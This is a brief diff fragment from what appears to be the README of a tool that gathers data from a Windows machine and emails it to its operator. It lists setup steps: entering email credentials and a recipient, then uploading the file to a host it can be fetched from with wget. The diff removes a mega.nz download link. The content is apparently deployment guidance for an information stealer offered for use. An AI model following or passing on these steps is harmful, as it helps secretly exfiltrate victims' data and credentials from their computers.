@@ -10,4 +10,3 @@ Windows machine and sends it to your email in a matter of seconds. It uses Windo
 * change the username, password, and recipient
 2) Upload the file to a host (possible to wget from)
 3)
-https://mega.nz/#!608nmD5T!iKkqWVtqVG8cJRGeDe8FKBX4vGotxdq6Zoz8DzROfYw
